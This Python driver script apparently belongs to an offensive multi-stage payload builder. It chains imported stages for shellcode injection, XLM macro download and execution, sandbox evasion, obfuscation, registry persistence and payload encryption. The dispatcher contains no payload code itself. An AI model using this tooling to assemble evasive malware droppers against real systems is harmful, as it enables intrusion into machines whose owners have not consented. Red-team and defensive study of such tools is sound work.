import json
import time
import os
import argparse
from stage_builders.shellcode_injection import *
from stage_builders.gadget2jscript import *
from stage_builders.xlm_download import *
from stage_builders.xlm_execute import *
from stage_builders.xlm_inject import *
from stage_builders.xlm_regkey import *
from stage_builders.xlm_obfuscate import *
from stage_builders.xlm_sandboxcheck import *
from stage_builders.exe_to_shellcode import *
from stage_builders.encrypt_aes import *
from stage_builders.encrypt_xor import *
from stage_builders.crossfit import *
from stage_builders.get_file import *
from stage_builders.compile_sln import *


parser = argparse.ArgumentParser(description='Flexible multi-stage payload builder framework')
parser.add_argument('-c','--config', help='path to config file', required=False)
args = parser.parse_args()

if not args.config: 
    CONFIG = "configs/HELLFIRE.json"
else: 
    CONFIG = args.config

config_file = open(CONFIG, "r")
parsed_conf = (json.loads(config_file.read()))
build_name = parsed_conf['name']
build_version = parsed_conf['version']
timestamp = time.strftime("%Y%m%d-%H%M%S")
build_directory = "build_outputs/{}_v{}_{}".format(build_name, build_version, timestamp)
os.makedirs(build_directory, exist_ok = False)

def stage_loader(stage, previous_stage): 
    name = stage['action']
    if name == "getfile":
        stage_builder = GetFile(stage, previous_stage)
        return stage_builder.build(build_directory)
    elif name == "shellcode_injection":
        try: 
            stage_builder = Shellcode_Injection(stage, previous_stage)
        except OSError: 
            print("Stage builder does not support your OS")
        return stage_builder.build(build_directory)
    elif name == "gadget2jscript":
        try: 
            stage_builder = Gadget2JScript(stage, previous_stage)
        except OSError: 
            print("Stage builder does not support your OS")
            return False
        return stage_builder.build(build_directory)
    elif name == "xlm_download":
        stage_builder = XLM_Download(stage, previous_stage)
        return stage_builder.build(build_directory)
    elif name == "xlm_execute":
        stage_builder = XLM_Execute(stage, previous_stage)
        return stage_builder.build(build_directory)
    elif name == "xlm_inject":
        stage_builder = XLM_Inject(stage, previous_stage)
        return stage_builder.build(build_directory)
    elif name == "xlm_sandboxcheck":
        stage_builder = XLM_Sandboxcheck(stage, previous_stage)
        return stage_builder.build(build_directory)
    elif name == "xlm_obfuscate":
        stage_builder = XLM_Obfuscate(stage, previous_stage)
        return stage_builder.build(build_directory)
    elif name == "xlm_regkey":
        stage_builder = XLM_Regkey(stage, previous_stage)
        return stage_builder.build(build_directory)
    elif name == "exe2shellcode_srdi":
        stage_builder = Exe2Shellcode(stage, previous_stage)
        return stage_builder.build(build_directory)
    elif name == "crossfit":
        stage_builder = Crossfit(stage, previous_stage)
        return stage_builder.build(build_directory)
    elif name == "encrypt_aes":
        stage_builder = EncryptAES(stage, previous_stage)
        return stage_builder.build(build_directory)
    elif name == "encrypt_xor":
        stage_builder = EncryptXOR(stage, previous_stage)
        return stage_builder.build(build_directory)
    elif name == "compile_sln":
        stage_builder = CompileSln(stage, previous_stage)
        return stage_builder.build(build_directory)
    else: 
        print("Stage {} not supported".format(name))
        return False

previous_stage = None
for current_stage in parsed_conf['stages']: 
    action = current_stage['action']
    print("Building stage: {}".format(action))
    finished_stage = stage_loader(current_stage, previous_stage)
    if finished_stage: 
        previous_stage = finished_stage
    else: 
        print("Stage build has FAILED")

print("STOP! HAMMERTIME!")